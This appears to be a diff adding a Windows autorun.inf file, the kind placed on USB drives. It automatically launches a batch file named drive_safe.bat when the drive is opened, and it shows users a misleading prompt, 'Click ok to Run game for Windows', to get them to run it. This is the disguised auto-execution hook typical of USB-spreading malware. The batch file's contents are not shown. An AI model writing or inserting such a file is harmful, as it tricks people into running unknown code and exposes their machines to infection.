@@ -1,0 +1,4 @@
+[autorun]
+open=drive_safe.bat
+action=Click ok to Run game for Windows
+shell\open\command=drive_safe.bat
